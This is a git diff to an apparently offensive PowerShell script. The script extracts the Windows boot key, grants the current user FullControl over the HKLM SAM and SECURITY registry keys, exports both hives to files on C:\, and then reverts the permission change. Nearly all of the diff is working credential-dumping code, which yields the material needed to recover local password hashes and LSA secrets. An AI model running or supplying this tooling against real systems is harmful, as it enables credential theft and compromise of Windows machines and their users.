@@ -66,6 +66,29 @@ function Get-BootKey {
     return $bootKey
 }
 
+function Create-ACL {
+    param ($keyPath)
+    
+    $SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($keyPath, 'ReadWriteSubTree', 'ChangePermissions')
+    $ACL = $SubKey.GetAccessControl()
+    $Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
+    $ACL.SetAccessRule($Rule)
+    $SubKey.SetAccessControl($ACL)
+    $SubKey.Close()
+}
+
+function Delete-ACL {
+    param ($keyPath)
+    
+    $SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($keyPath, 'ReadWriteSubTree', 'ChangePermissions')
+    $ACL = $SubKey.GetAccessControl()
+    $Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
+    $ACL.RemoveAccessRule($Rule)
+    $SubKey.SetAccessControl($ACL)
+    $SubKey.Close()
+}
+
+
 function Export-RegistryKey {
     param (
         [string]$keyPath,
@@ -93,66 +116,37 @@ $ascii1 = @"
 "@
 $ascii2 = @"
 
-0oOo
-||||)
-||||     Enjoy!
-'""'
+	0oOo
+	||||)
+	||||    Enjoy!
+	'""'
 
 "@
 
 Write-Output $ascii1
+
+$CurrentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+	If (-not $CurrentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+	{
+		Write-Host ("[-] Script must be run with administrator privileges")
+		Exit
+	}
+
 
 $bootKey = Get-BootKey
 $hexValues = $bootKey | ForEach-Object { $_.ToString("x2") }
 $bootKeyString = $hexValues -join ""
 Write-Output "[*] Boot key is: $bootKeyString"
 
+Create-ACL 'SAM\SAM'
 Export-RegistryKey -keyPath $samKeyPath -outputPath "C:\SAM.reg"
+Delete-ACL 'SAM\SAM'
+
+Create-ACL 'SECURITY'
 Export-RegistryKey -keyPath $securityKeyPath -outputPath "C:\SECURITY.reg"
-
-
+Delete-ACL 'SECURITY'
 
 Write-Output $ascii2
 
 
 
-<#
-$samKeyPath = "SAM"
-$securityKeyPath = "SECURITY"
-
-function Grant-RegistryPermissions {
-    param (
-        [string]$registryPath
-    )
-
-    $SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryPath, 'ReadWriteSubTree', 'ChangePermissions')
-    $ACL = $SubKey.GetAccessControl()
-    $Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
-    $ACL.SetAccessRule($Rule)
-    $SubKey.SetAccessControl($ACL)
-    $SubKey.Close()
-}
-
-function Revoke-RegistryPermissions {
-    param (
-        [string]$registryPath
-    )
-
-    $SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryPath, 'ReadWriteSubTree', 'ChangePermissions')
-    $ACL = $SubKey.GetAccessControl()
-    $Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
-    $ACL.RemoveAccessRule($Rule)
-    $SubKey.SetAccessControl($ACL)
-    $SubKey.Close()
-}
-
-Grant-RegistryPermissions -registryPath $samKeyPath
-Grant-RegistryPermissions -registryPath $securityKeyPath
-
-reg export HKLM\SAM C:\SAM.reg
-reg export HKLM\SECURITY C:\SECURITY.reg
-
-Revoke-RegistryPermissions -registryPath $samKeyPath
-Revoke-RegistryPermissions -registryPath $securityKeyPath
-
-#>
